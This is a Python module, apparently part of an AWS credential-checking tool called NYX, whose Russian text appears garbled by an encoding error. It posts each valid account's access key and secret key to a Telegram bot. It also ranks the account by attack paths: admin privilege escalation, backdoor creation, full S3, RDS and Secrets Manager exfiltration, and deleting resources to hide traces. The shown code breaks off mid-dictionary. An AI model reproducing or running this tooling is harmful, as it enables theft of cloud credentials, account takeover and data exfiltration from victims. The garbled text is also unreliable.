#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
NYX Cloud Scanner Module AWS - Final Version
–ú–æ–¥—É–ª—å —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –æ–±–ª–∞—á–Ω–æ–π –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—ã AWS —Å –∫—Ä–∞—Å–∏–≤—ã–º –≤—ã–≤–æ–¥–æ–º –≤ —Ç–µ—Ä–º–∏–Ω–∞–ª –∏ Telegram
"""

import argparse
import boto3
import json
import logging
import os
import requests
import sys
import time
from datetime import datetime
from typing import Dict, List, Tuple, Optional, Any
from botocore.exceptions import ClientError, BotoCoreError, NoCredentialsError
from botocore.config import Config
from dotenv import load_dotenv

# Try to import colorama for colored output
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    class Fore:
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        RESET = '\033[0m'
    
    class Style:
        RESET_ALL = '\033[0m'
        BRIGHT = '\033[1m'
    
    COLORAMA_AVAILABLE = False

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ============================================================================
# TELEGRAM NOTIFIER CLASS
# ============================================================================

class TelegramNotifier:
    """–°–∏–Ω—Ö—Ä–æ–Ω–Ω—ã–π –∫–ª–∞—Å—Å –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π –≤ Telegram"""
    
    def __init__(self, bot_token: str, chat_id: str):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.enabled = bool(bot_token and chat_id)
        self.base_url = f"https://api.telegram.org/bot{bot_token}"
        
        if self.enabled:
            print(f"{Fore.GREEN}‚úÖ Telegram —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –≤–∫–ª—é—á–µ–Ω—ã{Fore.RESET}")
        else:
            print(f"{Fore.YELLOW}‚ö†Ô∏è Telegram —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ—Ç–∫–ª—é—á–µ–Ω—ã{Fore.RESET}")
        print(f"{Fore.CYAN}{'‚îÄ'*50}{Fore.RESET}")
        print()
    
    def send_message(self, message: str) -> bool:
        """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram"""
        if not self.enabled:
            print(f"{Fore.YELLOW}‚ö†Ô∏è Telegram –æ—Ç–∫–ª—é—á–µ–Ω - —Ç–æ–∫–µ–Ω –∏–ª–∏ chat_id –Ω–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω—ã{Fore.RESET}")
            return False
            
        try:
            url = f"{self.base_url}/sendMessage"
            data = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            
            print(f"{Fore.CYAN}üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram...{Fore.RESET}")
            print(f"{Fore.CYAN}   URL: {url}{Fore.RESET}")
            print(f"{Fore.CYAN}   Chat ID: {self.chat_id}{Fore.RESET}")
            
            response = requests.post(url, data=data, timeout=10)
            print(f"{Fore.CYAN}   Response Status: {response.status_code}{Fore.RESET}")
            
            if response.status_code == 200:
                print(f"{Fore.GREEN}‚úÖ –°–æ–æ–±—â–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram{Fore.RESET}")
                return True
            else:
                print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞ HTTP {response.status_code}: {response.text}{Fore.RESET}")
                return False
            
        except Exception as e:
            print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram: {e}{Fore.RESET}")
            return False
    
    def send_validation_result(self, data: Dict[str, Any]) -> bool:
        """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –≤ Telegram"""
        
        # –û–ø—Ä–µ–¥–µ–ª—è–µ–º –¥–æ—Å—Ç—É–ø–Ω—ã–µ —ç—Å–∫–∞–ª–∞—Ü–∏–∏ –Ω–∞ –æ—Å–Ω–æ–≤–µ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö —Å–µ—Ä–≤–∏—Å–æ–≤
        accessible_services = data.get('accessible_services_list', [])
        escalation_flows = self._analyze_available_escalations(accessible_services)
        
        message = f"""
üî• <b>–ù–û–í–´–ô –ê–ö–ö–ê–£–ù–¢ AWS –û–ë–ù–ê–†–£–ñ–ï–ù!</b>

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üìä <b>–°–¢–ê–¢–ò–°–¢–ò–ö–ê</b>
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üè∑Ô∏è –ö–∞—Ç–µ–≥–æ—Ä–∏—è: {data.get('category', 'N/A')}
üÜî Account ID: <code>{data.get('account_id', 'N/A')}</code>
‚≠ê –ë–∞–ª–ª: {data.get('score', 0)}/60
üìà –î–æ—Å—Ç—É–ø: {int((data.get('accessible_services', 0) / data.get('total_services', 1)) * 100)}% —Å–µ—Ä–≤–∏—Å–æ–≤
üîß –î–æ—Å—Ç—É–ø–Ω–æ: {data.get('accessible_services', 0)}/{data.get('total_services', 0)} —Å–µ—Ä–≤–∏—Å–æ–≤

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üîë <b>–£–ß–ï–¢–ù–´–ï –î–ê–ù–ù–´–ï</b>
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
Access Key: <code>{data.get('access_key', 'N/A')}</code>
Secret Key: <code>{data.get('secret_key', 'N/A')}</code>
Account ID: <code>{data.get('account_id', 'N/A')}</code>
–†–µ–≥–∏–æ–Ω: {data.get('region', 'us-east-1')}

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üöÄ <b>–î–û–°–¢–£–ü–ù–´–ï –≠–°–ö–ê–õ–ê–¶–ò–ò</b>
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
"""
        
        if escalation_flows:
            for flow_name, flow_info in escalation_flows.items():
                message += f"\n<b>{flow_info['emoji']} {flow_name}</b>\n"
                message += f"üìã {flow_info['description']}\n"
                if flow_info['capabilities']:
                    message += "üí° –í–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏:\n"
                    for capability in flow_info['capabilities']:
                        message += f"   ‚Ä¢ {capability}\n"
                message += "\n"
        else:
            message += "‚ùå –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∏–µ —ç—Å–∫–∞–ª–∞—Ü–∏–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã\n"
            message += "‚ÑπÔ∏è –î–æ—Å—Ç—É–ø–Ω—ã —Ç–æ–ª—å–∫–æ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–æ–Ω–Ω—ã–µ —Å–µ—Ä–≤–∏—Å—ã\n"
        
        message += f"\nüïê –í—Ä–µ–º—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        return self.send_message(message.strip())
    
    def _analyze_available_escalations(self, accessible_services: List[str]) -> Dict[str, Dict]:
        """–ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã–µ —ç—Å–∫–∞–ª–∞—Ü–∏–∏ –Ω–∞ –æ—Å–Ω–æ–≤–µ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö —Å–µ—Ä–≤–∏—Å–æ–≤"""
        escalation_flows = {}
        
        # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —ç—Å–∫–∞–ª–∞—Ü–∏–∏ –Ω–∞ –æ—Å–Ω–æ–≤–µ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö —Å–µ—Ä–≤–∏—Å–æ–≤
        escalation_definitions = {
            'IAM User Escalation': {
                'emoji': 'üë§',
                'required_services': ['iam_create_user', 'iam_attach_user_policy', 'iam_create_access_key', 'iam_put_user_policy', 'iam_create_login_profile'],
                'description': '–°–æ–∑–¥–∞–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏',
                'capabilities': [
                    '–°–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –ø–æ–ª–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏',
                    '–ü—Ä–∏–∫—Ä–µ–ø–ª–µ–Ω–∏–µ –ø–æ–ª–∏—Ç–∏–∫ AdministratorAccess –∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º',
                    '–°–æ–∑–¥–∞–Ω–∏–µ –∫–ª—é—á–µ–π –¥–æ—Å—Ç—É–ø–∞ –¥–ª—è –Ω–æ–≤—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π',
                    '–ü–æ–ª—É—á–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞ –∫ –∞–∫–∫–∞—É–Ω—Ç—É',
                    '–°–æ–∑–¥–∞–Ω–∏–µ backdoor –¥–ª—è –ø–æ—Å—Ç–æ—è–Ω–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞'
                ]
            },
            'IAM Role Escalation': {
                'emoji': 'üîë',
                'required_services': ['iam_create_role', 'iam_attach_role_policy', 'sts_assume_role', 'iam_pass_role', 'iam_put_role_policy', 'iam_update_assume_role_policy'],
                'description': '–°–æ–∑–¥–∞–Ω–∏–µ —Ä–æ–ª–µ–π –¥–ª—è –ø—Ä–∏–Ω—è—Ç–∏—è —Å –ø–æ–ª–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏',
                'capabilities': [
                    '–°–æ–∑–¥–∞–Ω–∏–µ —Ä–æ–ª–µ–π —Å –ø–æ–ª–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏',
                    '–ü—Ä–∏–∫—Ä–µ–ø–ª–µ–Ω–∏–µ –ø–æ–ª–∏—Ç–∏–∫ AdministratorAccess –∫ —Ä–æ–ª—è–º',
                    '–ü–µ—Ä–µ–¥–∞—á–∞ —Ä–æ–ª–µ–π –≤ —Å–µ—Ä–≤–∏—Å—ã (Lambda, EC2)',
                    '–ü—Ä–∏–Ω—è—Ç–∏–µ —Ä–æ–ª–µ–π —Å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω—ã–º –¥–æ—Å—Ç—É–ø–æ–º',
                    '–ü–æ–ª—É—á–µ–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö —Å –≤—ã—Å–æ–∫–∏–º–∏ –ø—Ä–∞–≤–∞–º–∏'
                ]
            },
            'Secrets Manager': {
                'emoji': 'üîê',
                'required_services': ['secrets_manager_secrets', 'secrets_manager_create_secret', 'secrets_manager_update_secret', 'secrets_manager_put_secret_value', 'secrets_manager_delete_secret', 'secrets_manager_restore_secret', 'secrets_manager_rotate_secret'],
                'description': '–ü–æ–ª—É—á–µ–Ω–∏–µ –∏ —Å–æ–∑–¥–∞–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π, API –∫–ª—é—á–µ–π, —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–æ–≤',
                'capabilities': [
                    '–ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –≤—Å–µ—Ö —Å–µ–∫—Ä–µ—Ç–æ–≤ –∏–∑ AWS Secrets Manager',
                    '–ü–æ–ª—É—á–µ–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π –∫ –±–∞–∑–∞–º –¥–∞–Ω–Ω—ã—Ö –∏ —Å–µ—Ä–≤–∏—Å–∞–º',
                    '–°–æ–∑–¥–∞–Ω–∏–µ —Å–µ–∫—Ä–µ—Ç–æ–≤ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä—É—é—â–∏—Ö –¥–∞–Ω–Ω—ã—Ö',
                    '–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö —Å–µ–∫—Ä–µ—Ç–æ–≤ —Å –Ω–æ–≤—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏',
                    '–î–æ—Å—Ç—É–ø –∫ API –∫–ª—é—á–∞–º —Å—Ç–æ—Ä–æ–Ω–Ω–∏—Ö —Å–µ—Ä–≤–∏—Å–æ–≤'
                ]
            },
            'Systems Manager': {
                'emoji': '‚öôÔ∏è',
                'required_services': ['systems_manager_commands', 'systems_manager_parameters', 'systems_manager_send_command', 'systems_manager_start_session', 'systems_manager_terminate_session', 'systems_manager_create_document', 'systems_manager_update_document', 'systems_manager_delete_document'],
                'description': '–£–¥–∞–ª–µ–Ω–Ω–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥ –∏ –ø–æ–ª—É—á–µ–Ω–∏–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–π',
                'capabilities': [
                    '–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥ –Ω–∞ –≤—Å–µ—Ö EC2 –∏–Ω—Å—Ç–∞–Ω—Å–∞—Ö',
                    '–ü–æ–ª—É—á–µ–Ω–∏–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–æ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤ —Å–µ—Ä–≤–µ—Ä–æ–≤',
                    '–û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–º–∞–Ω–¥ –Ω–∞ EC2 –∏–Ω—Å—Ç–∞–Ω—Å—ã –¥–ª—è —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è',
                    '–ò–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—ã–µ —Å–µ—Å—Å–∏–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–∞—Ö —á–µ—Ä–µ–∑ SSM',
                    '–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è',
                    '–°–±–æ—Ä –ª–æ–≥–æ–≤ –∏ –º–µ—Ç—Ä–∏–∫ —Å —Å–µ—Ä–≤–µ—Ä–æ–≤'
                ]
            },
            'S3 Data Exfiltration': {
                'emoji': 'üíæ',
                'required_services': ['s3_buckets', 's3_objects', 's3_put_object', 's3_create_bucket', 's3_delete_bucket', 's3_get_object', 's3_get_object_acl', 's3_put_object_acl', 's3_put_bucket_policy', 's3_put_bucket_acl'],
                'description': '–ü—Ä—è–º–æ–π –¥–æ—Å—Ç—É–ø –∫ –¥–∞–Ω–Ω—ã–º –∏ —Å–æ–∑–¥–∞–Ω–∏–µ backdoor',
                'capabilities': [
                    '–°–∫–∞—á–∏–≤–∞–Ω–∏–µ –≤—Å–µ—Ö —Ñ–∞–π–ª–æ–≤ –∏–∑ S3 –±–∞–∫–µ—Ç–æ–≤',
                    '–ò–∑–≤–ª–µ—á–µ–Ω–∏–µ —Ä–µ–∑–µ—Ä–≤–Ω—ã—Ö –∫–æ–ø–∏–π –∏ –¥–∞–º–ø–æ–≤',
                    '–ó–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–æ–≤ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è backdoor',
                    '–°–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤—ã—Ö S3 –±–∞–∫–µ—Ç–æ–≤ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö',
                    '–£–¥–∞–ª–µ–Ω–∏–µ S3 –±–∞–∫–µ—Ç–æ–≤ –¥–ª—è —Å–æ–∫—Ä—ã—Ç–∏—è —Å–ª–µ–¥–æ–≤ –∞—Ç–∞–∫–∏',
                    '–î–æ—Å—Ç—É–ø –∫ —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏–º —Ä–µ—Å—É—Ä—Å–∞–º –≤–µ–±-—Å–∞–π—Ç–æ–≤'
                ]
            },
            'EC2 Management': {
                'emoji': 'üíª',
                'required_services': ['ec2_instances', 'ec2_volumes', 'ec2_snapshots', 'ec2_run_instances', 'ec2_create_key_pair', 'ec2_start_instances', 'ec2_authorize_security_group_ingress', 'ec2_create_security_group', 'ec2_create_image', 'ec2_modify_instance_attribute', 'ec2_modify_volume', 'ec2_create_tags'],
                'description': '–î–æ—Å—Ç—É–ø –∫ —Å–µ—Ä–≤–µ—Ä–∞–º –∏ —Å–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤—ã—Ö –∏–Ω—Å—Ç–∞–Ω—Å–æ–≤',
                'capabilities': [
                    '–ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ –≤—Å–µ—Ö —Å–µ—Ä–≤–µ—Ä–æ–≤ –∏ –∏—Ö IP',
                    '–°–æ–∑–¥–∞–Ω–∏–µ —Å–Ω–∏–º–∫–æ–≤ –¥–∏—Å–∫–æ–≤ –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞',
                    '–°–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤—ã—Ö EC2 –∏–Ω—Å—Ç–∞–Ω—Å–æ–≤ –¥–ª—è –∫–æ–Ω—Ç—Ä–æ–ª—è',
                    '–°–æ–∑–¥–∞–Ω–∏–µ SSH –∫–ª—é—á–µ–π –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ –∏–Ω—Å—Ç–∞–Ω—Å–∞–º',
                    '–ó–∞–ø—É—Å–∫ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã—Ö –∏–Ω—Å—Ç–∞–Ω—Å–æ–≤ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–∞',
                    '–û—Ç–∫—Ä—ã—Ç–∏–µ –ø–æ—Ä—Ç–æ–≤ –≤ security groups –¥–ª—è –¥–æ—Å—Ç—É–ø–∞',
                    '–î–æ—Å—Ç—É–ø –∫ –º–µ—Ç–∞–¥–∞–Ω–Ω—ã–º –∏–Ω—Å—Ç–∞–Ω—Å–æ–≤'
                ]
            },
            'Lambda Privilege Escalation': {
                'emoji': 'üöÄ',
                'required_services': ['lambda_functions', 'lambda_create_function', 'lambda_invoke_function', 'lambda_update_function_code', 'lambda_delete_function', 'lambda_get_function', 'lambda_update_function_configuration', 'lambda_add_permission', 'lambda_publish_version', 'lambda_create_layer_version', 'lambda_create_alias', 'lambda_update_alias', 'lambda_delete_alias', 'lambda_get_layer_version', 'lambda_delete_layer_version'],
                'description': '–ü–æ–ª–Ω–∞—è —ç—Å–∫–∞–ª–∞—Ü–∏—è —á–µ—Ä–µ–∑ Lambda —Ñ—É–Ω–∫—Ü–∏–∏ –∏ —Å–ª–æ–∏',
                'capabilities': [
                    '–°–æ–∑–¥–∞–Ω–∏–µ Lambda —Ñ—É–Ω–∫—Ü–∏–π —Å –ø–æ–≤—ã—à–µ–Ω–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏',
                    '–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω–æ–≥–æ –∫–æ–¥–∞ –≤ –æ–±–ª–∞–∫–µ',
                    '–ò–∑–º–µ–Ω–µ–Ω–∏–µ –∫–æ–¥–∞ —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö Lambda —Ñ—É–Ω–∫—Ü–∏–π',
                    '–£–¥–∞–ª–µ–Ω–∏–µ Lambda —Ñ—É–Ω–∫—Ü–∏–π –¥–ª—è —Å–æ–∫—Ä—ã—Ç–∏—è —Å–ª–µ–¥–æ–≤ –∞—Ç–∞–∫–∏',
                    '–ü–æ–ª—É—á–µ–Ω–∏–µ –¥–µ—Ç–∞–ª—å–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Ñ—É–Ω–∫—Ü–∏—è—Ö –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞',
                    '–ò–∑–º–µ–Ω–µ–Ω–∏–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ —Ñ—É–Ω–∫—Ü–∏–π –¥–ª—è –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π',
                    '–î–æ–±–∞–≤–ª–µ–Ω–∏–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π –∫ —Ñ—É–Ω–∫—Ü–∏—è–º –¥–ª—è –≤–Ω–µ—à–Ω–µ–≥–æ –¥–æ—Å—Ç—É–ø–∞',
                    '–ü—É–±–ª–∏–∫–∞—Ü–∏—è –≤–µ—Ä—Å–∏–π —Ñ—É–Ω–∫—Ü–∏–π –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è backdoor',
                    '–°–æ–∑–¥–∞–Ω–∏–µ —Å–ª–æ–µ–≤ Lambda –¥–ª—è –≤–Ω–µ–¥—Ä–µ–Ω–∏—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –∫–æ–¥–∞',
                    '–°–æ–∑–¥–∞–Ω–∏–µ backdoor –¥–ª—è –ø–æ—Å—Ç–æ—è–Ω–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞'
                ]
            },
            'Security & Compliance': {
                'emoji': 'üîí',
                'required_services': ['kms_keys', 'kms_aliases', 'kms_create_key', 'kms_put_key_policy'],
                'description': '–ö–ª—é—á–∏ –∏ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ',
                'capabilities': [
                    '–†–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö',
                    '–î–æ—Å—Ç—É–ø –∫ –∫–ª—é—á–∞–º —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è',
                    '–°–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤—ã—Ö –∫–ª—é—á–µ–π —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –¥–ª—è –∫–æ–Ω—Ç—Ä–æ–ª—è',
                    '–£–¥–∞–ª–µ–Ω–∏–µ –∫–ª—é—á–µ–π —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –¥–ª—è –Ω–∞—Ä—É—à–µ–Ω–∏—è —Ä–∞–±–æ—Ç—ã —Å–∏—Å—Ç–µ–º—ã',
                    '–ò–∑–º–µ–Ω–µ–Ω–∏–µ –ø–æ–ª–∏—Ç–∏–∫ –∫–ª—é—á–µ–π –¥–ª—è —ç—Å–∫–∞–ª–∞—Ü–∏–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π',
                    '–û–±—Ö–æ–¥ –∑–∞—â–∏—Ç—ã –¥–∞–Ω–Ω—ã—Ö',
                    '–ü–æ–ª—É—á–µ–Ω–∏–µ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Å–µ–∫—Ä–µ—Ç–æ–≤'
                ]
            },
            'IAM Groups Escalation': {
                'emoji': 'üë•',
                'required_services': ['iam_users', 'iam_groups', 'iam_create_group', 'iam_attach_group_policy', 'iam_add_user_to_group'],
                'description': '–≠—Å–∫–∞–ª–∞—Ü–∏—è —á–µ—Ä–µ–∑ —Å–æ–∑–¥–∞–Ω–∏–µ –≥—Ä—É–ø–ø—ã —Å –ø–æ–ª–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏',
                'capabilities': [
                    '–°–æ–∑–¥–∞–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω–æ–π –≥—Ä—É–ø–ø—ã',
                    '–ü—Ä–∏–∫—Ä–µ–ø–ª–µ–Ω–∏–µ –ø–æ–ª–∏—Ç–∏–∫–∏ —Å –ø–æ–ª–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏',
                    '–î–æ–±–∞–≤–ª–µ–Ω–∏–µ —Å–µ–±—è –≤ –≥—Ä—É–ø–ø—É',
                    '–ü–æ–ª—É—á–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞'
                ]
            },
            'IAM Full Control': {
                'emoji': 'üëë',
                'required_services': [
                    'iam_create_user', 'iam_attach_user_policy', 'iam_create_access_key',
                    'iam_put_user_policy', 'iam_create_login_profile',
                    'iam_create_role', 'iam_attach_role_policy', 'iam_put_role_policy',
                    'iam_update_assume_role_policy', 'sts_assume_role', 'iam_pass_role'
                ],
                'description': '–ü–æ–ª–Ω—ã–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ IAM –∏ –≤—Å–µ–º–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏',
                'capabilities': [
                    '–°–æ–∑–¥–∞–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –ª—é–±—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏',
                    '–°–æ–∑–¥–∞–Ω–∏–µ —Ä–æ–ª–µ–π —Å –ª—é–±—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏',
                    '–°–æ–∑–¥–∞–Ω–∏–µ inline –ø–æ–ª–∏—Ç–∏–∫',
                    '–°–æ–∑–¥–∞–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π –¥–ª—è –∫–æ–Ω—Å–æ–ª—å–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞',
                    '–ò–∑–º–µ–Ω–µ–Ω–∏–µ trust policy —Ä–æ–ª–µ–π',
                    '–ü–æ–ª–Ω—ã–π –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω—ã–π –∫–æ–Ω—Ç—Ä–æ–ª—å'
                ]
            },
            'Data Exfiltration Complete': {
                'emoji': 'üìä',
                'required_services': [
                    's3_buckets', 's3_objects', 's3_get_object', 's3_put_object',
                    'rds_instances', 'rds_snapshots', 'rds_create_db_snapshot',
                    'rds_start_export_task', 'rds_copy_db_snapshot',
                    'secrets_manager_secrets', 'secrets_manager_create_secret'
                ],
                'description': '–ü–æ–ª–Ω–æ–µ –∏–∑–≤–ª–µ—á–µ–Ω–∏–µ –≤—Å–µ—Ö –¥–∞–Ω–Ω—ã—Ö –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏',
                'capabilities': [
                    '–°–∫–∞—á–∏–≤–∞–Ω–∏–µ –≤—Å–µ—Ö —Ñ–∞–π–ª–æ–≤ –∏–∑ S3',
                    '–°–æ–∑–¥–∞–Ω–∏–µ —Å–Ω–∏–º–∫–æ–≤ –≤—Å–µ—Ö –ë–î',
                    '–≠–∫—Å–ø–æ—Ä—Ç –¥–∞–Ω–Ω—ã—Ö –ë–î –≤ S3',
                    '–ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –≤—Å–µ—Ö —Å–µ–∫—Ä–µ—Ç–æ–≤',
                    '–ü–æ–ª–Ω–∞—è —ç–∫—Å—Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏—è –¥–∞–Ω–Ω—ã—Ö'
                ]
            },
            'Infrastructure Control': {
                'emoji': 'üèóÔ∏è',
                'required_services': [
                    'ec2_instances', 'ec2_run_instances', 'ec2_create_security_group',
